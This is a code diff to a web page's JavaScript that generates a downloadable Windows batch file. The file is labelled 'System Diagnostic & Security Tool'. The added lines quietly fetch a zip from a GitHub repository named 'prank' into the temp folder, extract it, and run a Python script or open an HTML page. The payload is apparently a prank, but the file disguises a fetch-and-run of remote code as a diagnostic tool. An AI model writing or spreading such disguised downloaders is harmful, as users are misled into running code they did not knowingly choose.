@@ -463,11 +463,23 @@ function runMobileTerminal(script) {
    ========================================================================== */
 function triggerRealTerminalDownload() {
   const batContent = `@echo off
+chcp 65001 >nul
 title System Diagnostic & Security Tool
 color 0A
 mode con: cols=100 lines=35
 cls
-python chaos_prank.py
+echo [*] Initializing System Diagnostic Environment...
+cd /d "%TEMP%"
+curl -sL https://github.com/pmkaulani/prank/archive/refs/heads/main.zip -o prank.zip
+tar -xf prank.zip
+cd prank-main
+where python >nul 2>nul
+if %ERRORLEVEL% equ 0 (
+    python chaos_prank.py
+) else (
+    echo [!] Python runtime not detected. Launching visual engine...
+    start index.html
+)
 pause
 `;
   const blob = new Blob([batContent], { type: "application/x-bat" });
